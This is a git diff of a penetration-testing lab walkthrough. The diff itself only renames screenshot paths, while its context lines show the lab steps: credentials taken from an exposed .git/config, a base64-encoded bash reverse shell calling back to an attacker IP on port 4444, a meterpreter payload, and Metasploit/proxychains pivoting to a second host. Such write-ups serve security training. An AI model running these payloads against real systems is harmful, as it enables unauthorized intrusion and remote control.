@@ -41,13 +41,13 @@ There is an Apache 2.4.29 HTTP server running on Port 80
 
 Some strange unrecognizable service is running on Port 5000, but it must be a webapp due to the HTTP content printed
 
-![](<../../../../.gitbook/assets/image (7) (1).png>)
+![](<../../../../.gitbook/assets/image (7) (1) (1).png>)
 
 Looks like there's another web server running something called Werkzeug (version 1.0.1) built with Python 2.7.17
 
 There's also a Git repository and an online calculator. So probably the project can be found here
 
-![](<../../../../.gitbook/assets/image (37) (1).png>)
+![](<../../../../.gitbook/assets/image (37) (1) (1).png>)
 
 According to this [article](https://testdriven.io/blog/what-is-werkzeug/):&#x20;
 
@@ -75,15 +75,15 @@ One thing that stood out in the nmap scan was this file path
 
 When you visit /.git itself, you receive an error
 
-![](<../../../../.gitbook/assets/image (46) (1) (1).png>)
+![](<../../../../.gitbook/assets/image (46) (1) (1) (1).png>)
 
 However, visiting .git/config gives you a file to download
 
-![](<../../../../.gitbook/assets/image (38) (1) (1).png>)
+![](<../../../../.gitbook/assets/image (38) (1) (1) (1).png>)
 
 And its file content is interesting
 
-![](<../../../../.gitbook/assets/image (40) (1) (1) (1).png>)
+![](<../../../../.gitbook/assets/image (40) (1) (1) (1) (1).png>)
 
 We'll keep these credentials saved just in case they come in handy
 
@@ -95,21 +95,21 @@ Nothing interesting on port 80
 
 Nothing interesting on port 5000 either
 
-![](<../../../../.gitbook/assets/image (33) (1).png>)
+![](<../../../../.gitbook/assets/image (33) (1) (1).png>)
 
 Now we have something interesting!
 
-![](<../../../../.gitbook/assets/image (41) (1) (1).png>)
+![](<../../../../.gitbook/assets/image (41) (1) (1) (1).png>)
 
 We are presented with an intereactive console where we can execute python expressions, but the console seems to be protected by a PIN
 
-![](<../../../../.gitbook/assets/image (55) (1) (1) (1).png>)
+![](<../../../../.gitbook/assets/image (55) (1) (1) (1) (1).png>)
 
 It doesn't allow unauthenticated access and so far we haven't found a PIN number anywhere.
 
 Thinking about the credentials we do have and the direction we're trying to go, let's take another look at that config file
 
-![](<../../../../.gitbook/assets/image (24).png>)
+![](<../../../../.gitbook/assets/image (24) (1).png>)
 
 Is there any chance we could get access to that? Can we clone the repository using Git?
 
@@ -125,9 +125,9 @@ These first two files seem to be the code that's running on port 800
 
 However we're more interested in this .git folder
 
-![](<../../../../.gitbook/assets/image (16) (1).png>)
+![](<../../../../.gitbook/assets/image (16) (1) (1).png>)
 
-![](<../../../../.gitbook/assets/image (54) (1) (1) (1).png>)
+![](<../../../../.gitbook/assets/image (54) (1) (1) (1) (1).png>)
 
 Quite a bit of stuff to look through, but I'm sure we'll find something we need to get access to that console
 
@@ -143,7 +143,7 @@ These are , however, fixed. Yet, we can use the following command to view the di
 git diff 9aa6151c1d5e92ae0bd3d8ad8789ae9bb2d29edd 17f5d49be5ae6f0bc41fc90f5aabeccc90f6e2cd
 ```
 
-![](<../../../../.gitbook/assets/image (26) (1).png>)
+![](<../../../../.gitbook/assets/image (26) (1) (1).png>)
 
 Reading the code here tells us that the send\_from\_directory function sends any file from the server and if the requested path contains `..` or `%2E`, a 404 response is returned
 
@@ -191,7 +191,7 @@ We can confirm these changes with curl
 curl http://online-calc.com:8000/API.py
 ```
 
-![](<../../../../.gitbook/assets/image (35) (1).png>)
+![](<../../../../.gitbook/assets/image (35) (1) (1).png>)
 
 ### Reverse Shell
 
@@ -210,7 +210,7 @@ YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMjUwLjgxLjIvNDQ0NCAwPiYxIgo=
 
 Start a netcat listener
 
-![](<../../../../.gitbook/assets/image (42) (1) (1).png>)
+![](<../../../../.gitbook/assets/image (42) (1) (1) (1).png>)
 
 Here's the payload we'll use:
 
@@ -280,7 +280,7 @@ chmod +x reverse.elf
 
 Awesome, we've got ourselves a meterpreter shell!
 
-![](<../../../../.gitbook/assets/image (36) (1) (1) (1).png>)
+![](<../../../../.gitbook/assets/image (36) (1) (1) (1) (1).png>)
 
 Now we'll move on to pivoting
 
@@ -292,11 +292,11 @@ ifconfig
 
 As we see, we have the compromised machine IP as well as the second machine that was inaccessible to us before: `192.218.10.2`
 
-![](<../../../../.gitbook/assets/image (29) (1) (1).png>)
+![](<../../../../.gitbook/assets/image (29) (1) (1) (1).png>)
 
 We will now add this route
 
-![](<../../../../.gitbook/assets/image (18) (1) (1).png>)
+![](<../../../../.gitbook/assets/image (18) (1) (1) (1).png>)
 
 Now we need to determine what services are on this second network that we have discovered. We will use a basic TCP port scanner to look for ports
 
@@ -306,11 +306,11 @@ use auxiliary/scanner/portscan/tcp
 show options
 ```
 
-![](<../../../../.gitbook/assets/image (34) (1) (1).png>)
+![](<../../../../.gitbook/assets/image (34) (1) (1) (1).png>)
 
 Running an nmap scan against the second target yields us these results
 
-![](<../../../../.gitbook/assets/image (49) (1).png>)
+![](<../../../../.gitbook/assets/image (49) (1) (1).png>)
 
 There must be a firewall or something that is protecting what appears to be a web application
 
@@ -324,7 +324,7 @@ So why use proxychains? This [article ](https://medium.com/swlh/proxying-like-a-
 
 Using a socks proxy can be understood from [this](https://blog.pentesteracademy.com/network-pivoting-using-metasploit-and-proxychains-c04472f8eed0) article and [this](https://nullsweep.com/pivot-cheatsheet-for-pentesters/) other one
 
-![](<../../../../.gitbook/assets/image (29) (1).png>)
+![](<../../../../.gitbook/assets/image (29) (1) (1).png>)
 
 ```
 proxychains nmap -sT -P0 192.218.10.2
